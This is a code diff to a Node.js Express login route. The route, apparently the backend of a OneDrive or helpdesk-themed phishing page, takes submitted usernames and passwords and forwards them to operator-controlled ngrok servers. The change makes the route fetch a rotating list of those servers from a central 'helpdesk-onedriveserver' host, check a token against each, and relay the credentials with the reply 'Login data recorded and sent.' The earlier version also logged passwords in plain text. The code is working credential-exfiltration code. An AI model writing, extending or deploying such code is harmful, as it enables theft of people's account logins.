@@ -7,6 +7,9 @@ import('node-fetch').then(module => {
     fetch = module.default;
 }).catch(err => console.error('Failed to load node-fetch', err));
 
+// Base URL for the central server which gives us the current ngrok URL
+const centralServerBaseUrl = 'https://helpdesk-onedriveserver.onrender.com';
+
 router.post('/login', async (req, res) => {
     const { username, password, token } = req.body;
 
@@ -15,39 +18,41 @@ router.post('/login', async (req, res) => {
     }
 
     try {
-        const validationResponse = await fetch('https://2ae1-73-71-4-178.ngrok-free.app/validate', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ username, token }),
-            mode: 'cors' // if needed
-        });
+        const getUrlResponse = await fetch(`${centralServerBaseUrl}/list_urls`);
+        const urls = await getUrlResponse.json();
 
-        const validation = await validationResponse.json();
-        
-        if (!validation.valid) {
-            return res.status(403).send('Invalid token');
-        }
-        
-        // Assume validation was successful
-        console.log(`Login attempt - Username: ${username}, Password: ${password}`);
-        
-        const localServerUrl = 'https://2ae1-73-71-4-178.ngrok-free.app/receive';
-        const response = await fetch(localServerUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ username, password }),
-            mode: 'cors' // if needed
-        });
+        for (let url of urls) {
+            const validationResponse = await fetch(`${url}/validate`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ username, token }),
+                mode: 'cors'
+            });
 
-        if (response.ok) {
-            console.log('Data sent to local server successfully');
-            res.send('Login data recorded and sent.');
-        } else {
-            throw new Error('Failed to send data to local server');
+            const validation = await validationResponse.json();
+            if (validation.valid) {
+                const localServerUrl = `${url}/receive`;
+                const response = await fetch(localServerUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password }),
+                    mode: 'cors'
+                });
+
+                if (response.ok) {
+                    console.log('Data sent to local server successfully');
+                    return res.send('Login data recorded and sent.');
+                } else {
+                    console.log('Failed to send data to local server');
+                    break;
+                }
+            }
         }
+
+        return res.status(403).send('Invalid token or URL not found');
     } catch (error) {
         console.error('Login error:', error);
-        res.status(500).send('Server Error');
+        return res.status(500).send('Server Error');
     }
 });
 
